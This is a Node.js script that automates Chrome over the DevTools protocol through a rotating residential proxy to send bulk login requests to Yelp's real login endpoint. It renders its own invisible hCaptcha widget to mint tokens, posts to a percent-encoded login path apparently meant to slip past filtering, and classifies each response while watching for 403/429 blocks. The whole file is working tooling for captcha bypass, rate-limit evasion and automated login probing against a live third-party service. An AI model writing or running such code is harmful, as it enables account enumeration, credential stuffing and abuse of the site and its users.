// testpace/pace-multi.js - encoded-path lane + N tabs in parallel.
// Measures aggregate verdict throughput per IP and whether 429/403 ever appear.
//
// env: PU_BASE PW [PU] [SESSID] [BID=6] [TABS=4] [N=100]

const http = require('http');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const BID = parseInt(process.env.BID || '6', 10);
const TABS = parseInt(process.env.TABS || '4', 10);
const N = parseInt(process.env.N || '100', 10);
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const SESS = process.env.SESSID || ('pm' + BID + Math.floor(Math.random() * 100000));
const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + '-sesstime-1800');
const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
const LP = 9990 + BID, CP = 10390 + BID;
const OUT = process.env.OUT || path.join(__dirname, 'multi-' + SESS + '.jsonl');
const ENC = process.env.ENC_PATH || '/login/%6E%65%77%61%6A%61%78';

fs.writeFileSync(OUT, '');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
process.on('uncaughtException', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });

const relay = http.createServer((q, s) => {
  s.on('error', () => {}); q.on('error', () => {});
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

(async () => {
  rec({ event: 'start', sess: SESS, tabs: TABS, n: N, enc: ENC });
  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'pm-' + Date.now());
  const cdd = path.join(os.tmpdir(), 'yelp-cache', 'probe');
  try { fs.mkdirSync(cdd, { recursive: true }); } catch (e) {}
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--window-size=1000,800', '--lang=en-US',
    '--user-data-dir=' + udd,
    '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows', '--disable-renderer-backgrounding',
    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
    '--disk-cache-dir=' + cdd, '--disk-cache-size=67108864',
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP, 'about:blank'
  ], { stdio: 'ignore' });
  let ver = null;
  for (let k = 0; k < 80 && !ver; k++) { await sleep(250); try { ver = await (await fetch('http://127.0.0.1:' + CP + '/json/version')).json(); } catch (e) {} }
  if (!ver) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  ws.addEventListener('error', () => {});
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    if (m.method === 'Fetch.requestPaused') { ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId })); return; }
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  const sendS = (sid, mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
  const ev = (sid, e) => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 40000);
  });

  let first = null;
  for (let k = 0; k < 80 && !first; k++) {
    await sleep(250);
    const t = await send('Target.getTargets');
    if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) first = pg.targetId; }
  }
  if (!first) { rec({ event: 'abort', why: 'target' }); chrome.kill(); relay.close(); return; }
  const tabs = [];
  for (let k = 0; k < TABS; k++) {
    let tid = first;
    if (k > 0) { const c = await send('Target.createTarget', { url: 'about:blank' }); tid = c && c.result && c.result.targetId; }
    const a = await send('Target.attachToTarget', { targetId: tid, flatten: true });
    tabs.push({ k, sid: a && a.result && a.result.sessionId, csrf: '', ready: false, posts: 0 });
  }
  for (const tab of tabs) {
    await sendS(tab.sid, 'Page.enable'); await sendS(tab.sid, 'Network.enable', {});
    await sendS(tab.sid, 'Emulation.setFocusEmulationEnabled', { enabled: true });
    await sendS(tab.sid, 'Fetch.enable', { patterns: [
      { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
      { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
      { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }] });
    await sendS(tab.sid, 'Page.navigate', { url: 'https://www.yelp.com/login/' });
  }
  await Promise.all(tabs.map(async tab => {
    for (let k = 0; k < 40; k++) {
      await sleep(1000);
      const s = await ev(tab.sid, `JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
      try { const o = JSON.parse(s); if (o && o.f && o.h) { tab.ready = true; break; } } catch (e) {}
    }
    if (tab.ready) {
      tab.armed = await ev(tab.sid, `(function(){ if(!window.hcaptcha) return 'no-api'; var d=document.createElement('div');d.style.display='none';document.body.appendChild(d);window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__fcTok=t}});return 'own:'+window.__wid; })()`);
      tab.csrf = await ev(tab.sid, `(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:''})()`);
    }
    rec({ event: 'tab', k: tab.k, ready: tab.ready, armed: tab.armed, csrfLen: (tab.csrf || '').length });
  }));
  if (!tabs.some(t => t.ready)) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }

  const ready = tabs.filter(t => t.ready);
  const t0 = Date.now();
  const kinds = {}; const lat = [];
  let next = 0;

  async function worker(tab) {
    while (true) {
      const idx = next++;
      if (idx >= N) break;
      await sendS(tab.sid, 'Page.bringToFront', {});
      const tt = Date.now();
      let tok = '';
      try { tok = await ev(tab.sid, `new Promise(function(res){var w=window.__wid;window.__fcTok='';try{window.hcaptcha.execute(w)}catch(e){res('');return}var n=0;var iv=setInterval(function(){n++;var t=window.__fcTok||window.hcaptcha.getResponse(w)||'';if(t){clearInterval(iv);res(t)}else if(n>50){clearInterval(iv);res('')}},200)})`); } catch (e) {}
      const tokMs = Date.now() - tt;
      if (!tok) { rec({ event: 'tokfail', tab: tab.k, idx }); continue; }
      const body = new URLSearchParams({ csrftok: tab.csrf, email: 'm.' + idx + '.' + Date.now() + '@gmail.com', password: 'WrongPass!7788', hcaptcha_response: tok }).toString();
      const tp = Date.now();
      const raw = await ev(tab.sid, `(async function(){try{var r=await fetch(${JSON.stringify(ENC)},{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body:${JSON.stringify(body)}});var x=await r.text();return JSON.stringify({status:r.status,srv:r.headers.get('server')||'',body:x.slice(0,120)})}catch(e){return JSON.stringify({status:-1,body:String(e)})}})()`);
      const postMs = Date.now() - tp;
      let o = {}; try { o = JSON.parse(raw) } catch (e) {}
      const b = o.body || '';
      const kind = o.status !== 200 ? 'status' + o.status
        : /sending a login link|sending a magic link/i.test(b) ? 'magic'
        : /incorrect/i.test(b) ? 'incorrect'
        : /success": true/i.test(b) ? 'success'
        : /unable to log you in/i.test(b) ? 'unable' : 'other';
      kinds[kind] = (kinds[kind] || 0) + 1;
      tab.posts++;
      lat.push(tokMs + postMs);
      rec({ i: idx, tab: tab.k, t: Date.now() - t0, tokMs, postMs, status: o.status, kind, srv: o.srv, body: b.slice(0, 60) });
      if (o.status === 403 || o.status === 429) rec({ event: 'block', tab: tab.k, idx, status: o.status, body: b.slice(0, 60) });
    }
  }
  await Promise.all(ready.map(worker));

  const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
  const secs = Math.round((Date.now() - t0) / 1000);
  rec({ event: 'summary', sess: SESS, posted: lat.length, secs, perMin: lat.length ? Math.round(lat.length * 60 / Math.max(1, secs)) : 0, avgTokPostMs: avg(lat), kinds, tabs: ready.map(t => ({ k: t.k, posts: t.posts })) });

  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 500);
})();
